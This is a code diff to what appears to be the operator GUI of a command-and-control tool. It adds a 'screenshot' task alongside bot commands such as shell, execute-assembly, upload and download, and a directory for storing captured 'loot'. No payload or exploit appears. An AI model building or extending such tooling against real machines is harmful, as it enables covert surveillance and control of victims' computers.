@@ -62,7 +62,7 @@ QTextBrowser {
         self.socket_io_client.start(self.url, self.token, self.namespace)
 
 
-        self.commands = ['help', 'pingbot', 'killbot', 'cd', 'mkdir', 'rmdir', 'ls', 'pwd', 'ps', 'whoami', 'shell', 'execute-assembly','upload','download', 'clear']
+        self.commands = ['help', 'pingbot', 'killbot', 'cd', 'mkdir', 'rmdir', 'ls', 'pwd', 'ps', 'whoami', 'shell', 'execute-assembly','upload','download', 'screenshot', 'clear']
         self.completer = QCompleter( self.commands, self.bot_send_task_line_edit)
         self.completer.setCompletionMode(QCompleter.InlineCompletion)
 
@@ -87,6 +87,7 @@ QTextBrowser {
 
         self.bot_loot_terminal_dir = os.path.normpath(os.path.join(self.bot_loot_dir, "terminal"))
         self.bot_loot_download_dir = os.path.normpath(os.path.join(self.bot_loot_dir, "download"))
+        self.bot_loot_screenshot_dir = os.path.normpath(os.path.join(self.bot_loot_dir, "screenshot"))
         
 
 
@@ -116,6 +117,9 @@ QTextBrowser {
             os.makedirs(os.path.normpath(self.bot_loot_terminal_dir))
         if not os.path.exists(self.bot_loot_download_dir):
             os.makedirs(os.path.normpath(self.bot_loot_download_dir))
+        if not os.path.exists(self.bot_loot_screenshot_dir):
+            os.makedirs(os.path.normpath(self.bot_loot_screenshot_dir))
+
 
 
 
@@ -318,6 +322,6 @@ QTextBrowser {
         if file == "" or file is None:
             return
         self.create_loot_dir()
-        self._file_download_worker.setup_data(file, filename, self.bot_loot_download_dir)
+        self._file_download_worker.setup_data(file, filename, self.bot_loot_download_dir, self.bot_loot_screenshot_dir)
         self._file_download_worker_thread.start()
     
